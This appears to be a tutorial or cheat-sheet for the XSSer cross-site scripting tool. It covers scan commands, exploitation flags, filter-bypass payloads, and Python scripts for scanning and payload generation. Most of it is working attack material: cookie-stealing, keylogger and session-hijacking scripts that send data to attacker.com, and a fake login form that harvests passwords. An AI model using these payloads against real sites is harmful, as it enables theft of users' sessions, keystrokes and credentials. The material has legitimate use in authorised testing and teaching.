# XSSer - Cross-Site Scripting Detection and Exploitation

Automated tool for detecting and exploiting Cross-Site Scripting (XSS) vulnerabilities in web applications.

## Installation

```bash
# Ubuntu/Debian/Kali
apt install xsser

# From source
git clone https://github.com/epsylon/xsser.git
cd xsser
pip install -r requirements.txt
python setup.py install

# Manual execution
python xsser.py
```

## Basic XSS Detection

```bash
# Single URL testing
xsser --url "http://target.com/search.php?q=test"

# POST data testing
xsser --url "http://target.com/contact.php" --data="name=test&email=test@example.com&message=test"

# Cookie testing
xsser --url "http://target.com/profile.php" --cookie="sessionid=123; userid=456"

# Header testing
xsser --url "http://target.com/page.php" --headers="X-Forwarded-For:192.168.1.1"
```

## Advanced Detection Options

```bash
# All parameters testing
xsser --url "http://target.com/page.php?id=1&name=test" --auto

# Crawler mode
xsser --url "http://target.com" --crawl=3

# Forms testing
xsser --url "http://target.com" --forms

# Multiple vectors
xsser --url "http://target.com/search.php?q=test" --vectors="<script>alert(1)</script>,<img src=x onerror=alert(1)>"
```

## Custom Payload Options

```bash
# Custom payload file
xsser --url "http://target.com/search.php?q=test" --payload-list payloads.txt

# Specific payload
xsser --url "http://target.com/search.php?q=test" --payload="<svg onload=alert(1)>"

# Encoding options
xsser --url "http://target.com/search.php?q=test" --encoding=Hex

# Multiple encodings
xsser --url "http://target.com/search.php?q=test" --encoding=Mix
```

## Browser Integration

```bash
# PhantomJS integration
xsser --url "http://target.com/search.php?q=test" --phantom="phantom.js"

# Custom browser
xsser --url "http://target.com/search.php?q=test" --browser="/usr/bin/firefox"

# Headless mode
xsser --url "http://target.com/search.php?q=test" --headless
```

## Output and Reporting

```bash
# Verbose output
xsser --url "http://target.com/search.php?q=test" --verbose

# XML report
xsser --url "http://target.com/search.php?q=test" --xml=report.xml

# Save results
xsser --url "http://target.com/search.php?q=test" --save=results.txt

# Multiple output formats
xsser --url "http://target.com/search.php?q=test" --xml=report.xml --save=results.txt
```

## Exploitation Features

```bash
# Reverse shell payload
xsser --url "http://target.com/search.php?q=test" --reverse-check

# Data exfiltration
xsser --url "http://target.com/search.php?q=test" --steal-cookies

# Session hijacking
xsser --url "http://target.com/search.php?q=test" --steal-session

# Information gathering
xsser --url "http://target.com/search.php?q=test" --information
```

## Bypass Techniques

```bash
# WAF evasion
xsser --url "http://target.com/search.php?q=test" --ignore-proxy --timeout=30

# Custom user agent
xsser --url "http://target.com/search.php?q=test" --user-agent="Mozilla/5.0 Custom"

# Delay between requests
xsser --url "http://target.com/search.php?q=test" --delay=2

# Proxy usage
xsser --url "http://target.com/search.php?q=test" --proxy="http://127.0.0.1:8080"
```

## Batch Testing

```bash
# Multiple URLs from file
xsser --file=urls.txt --auto

# Mass testing
xsser --file=urls.txt --crawl=2 --forms

# Comprehensive scan
xsser --file=urls.txt --all --xml=mass_scan.xml
```

## Custom XSS Vectors

### Basic XSS Payloads
```html
<!-- Alert-based -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>

<!-- Advanced payloads -->
<script>fetch('http://attacker.com/'+document.cookie)</script>
<img src=x onerror=fetch('http://attacker.com/'+btoa(document.cookie))>

<!-- Event handlers -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>XSS</option></select>
<textarea onfocus=alert('XSS') autofocus>XSS</textarea>
```

### Filter Bypass Payloads
```html
<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x ONERROR=alert('XSS')>

<!-- Encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;

<!-- HTML entity encoding -->
<img src=x onerror=alert&#40;&#39;XSS&#39;&#41;>
<img src=x onerror=alert&#x28;&#x27;XSS&#x27;&#x29;>

<!-- JavaScript encoding -->
<script>\u0061lert('XSS')</script>
<script>eval('\x61lert("XSS")')</script>

<!-- Nested tags -->
<scr<script>ipt>alert('XSS')</script>
<img src=x onerr<script>or=alert('XSS')>
```

## Advanced Exploitation

### Cookie Stealing Script
```html
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie);
</script>
```

### Keylogger Payload
```html
<script>
document.onkeypress = function(e) {
    var img = new Image();
    img.src = 'http://attacker.com/keylog.php?key=' + String.fromCharCode(e.which);
}
</script>
```

### Session Hijacking
```html
<script>
fetch('http://attacker.com/hijack.php', {
    method: 'POST',
    body: JSON.stringify({
        cookie: document.cookie,
        url: window.location.href,
        referrer: document.referrer
    })
});
</script>
```

### DOM Manipulation
```html
<script>
// Redirect to attacker site
window.location = 'http://attacker.com/fake-login.php?return=' + encodeURIComponent(window.location);

// Modify page content
document.body.innerHTML = '<h1>Site Compromised</h1>';

// Create fake login form
var form = '<form action="http://attacker.com/harvest.php" method="post">';
form += 'Username: <input name="username" type="text"><br>';
form += 'Password: <input name="password" type="password"><br>';
form += '<input type="submit" value="Login">';
form += '</form>';
document.body.innerHTML = form;
</script>
```

## XSS Testing Methodology

### 1. Input Discovery
```bash
# Find input parameters
xsser --url "http://target.com" --crawl=3 --forms

# Test all discovered parameters
xsser --url "http://target.com/page.php" --auto
```

### 2. Context Analysis
```bash
# Analyze injection context
xsser --url "http://target.com/search.php?q=test" --check-context

# Test different contexts
xsser --url "http://target.com/page.php?id=<test>" --context-analysis
```

### 3. Filter Bypass
```bash
# Test various encoding
xsser --url "http://target.com/search.php?q=test" --encoding=All

# Custom bypass payloads
xsser --url "http://target.com/search.php?q=test" --payload-list=bypass.txt
```

## Custom Testing Scripts

### Automated XSS Scanner
```python
#!/usr/bin/env python3
import requests
from urllib.parse import urljoin, urlparse
import re

class XSSScanner:
    def __init__(self):
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
    def test_reflected_xss(self, url, param):
        """Test for reflected XSS"""
        vulnerabilities = []
        
        for payload in self.payloads:
            test_url = f"{url}?{param}={payload}"
            
            try:
                response = requests.get(test_url)
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Reflected XSS',
                        'url': test_url,
                        'payload': payload,
                        'parameter': param
                    })
            except:
                continue
                
        return vulnerabilities
    
    def test_stored_xss(self, url, data):
        """Test for stored XSS"""
        vulnerabilities = []
        
        for payload in self.payloads:
            # Inject payload
            test_data = data.copy()
            for key in test_data:
                test_data[key] = payload
                
            try:
                # Submit payload
                requests.post(url, data=test_data)
                
                # Check if payload is stored
                response = requests.get(url)
                if payload in response.text:
                    vulnerabilities.append({
                        'type': 'Stored XSS',
                        'url': url,
                        'payload': payload,
                        'data': test_data
                    })
                    
                test_data[key] = data[key]  # Reset
            except:
                continue
                
        return vulnerabilities

# Usage
scanner = XSSScanner()
reflected_vulns = scanner.test_reflected_xss("http://target.com/search.php", "q")
print(f"Found {len(reflected_vulns)} reflected XSS vulnerabilities")
```

### XSS Payload Generator
```python
#!/usr/bin/env python3
import html
import urllib.parse

class XSSPayloadGenerator:
    def __init__(self):
        self.base_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>"
        ]
    
    def generate_encoded_payloads(self, payload):
        """Generate various encoded versions of payload"""
        return {
            'html_encoded': html.escape(payload),
            'url_encoded': urllib.parse.quote(payload),
            'double_url_encoded': urllib.parse.quote(urllib.parse.quote(payload)),
            'unicode_encoded': payload.encode('unicode_escape').decode(),
            'hex_encoded': ''.join(f'%{ord(c):02x}' for c in payload)
        }
    
    def generate_context_payloads(self, context):
        """Generate payloads for specific contexts"""
        if context == 'attribute':
            return [
                "' onmouseover='alert(1)",
                '" onmouseover="alert(1)',
                "' onclick='alert(1)' x='",
                '" onclick="alert(1)" x="'
            ]
        elif context == 'script':
            return [
                "';alert(1);//",
                '";alert(1);//',
                "';alert(1);var x='",
                '";alert(1);var x="'
            ]
        elif context == 'html':
            return self.base_payloads
            
    def generate_filter_bypass(self):
        """Generate filter bypass payloads"""
        return [
            "<scr<script>ipt>alert(1)</script>",
            "<img src=x onerr<script>or=alert(1)>",
            "<svg/onload=alert(1)>",
            "<img src=x onerror=alert&#40;1&#41;>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>\u0061lert(1)</script>",
            "<script>eval('\\x61lert(1)')</script>"
        ]

# Usage
generator = XSSPayloadGenerator()
encoded_payloads = generator.generate_encoded_payloads("<script>alert(1)</script>")
for encoding, payload in encoded_payloads.items():
    print(f"{encoding}: {payload}")
```

Comprehensive tool for automated XSS detection and exploitation across various web application contexts and filtering mechanisms.
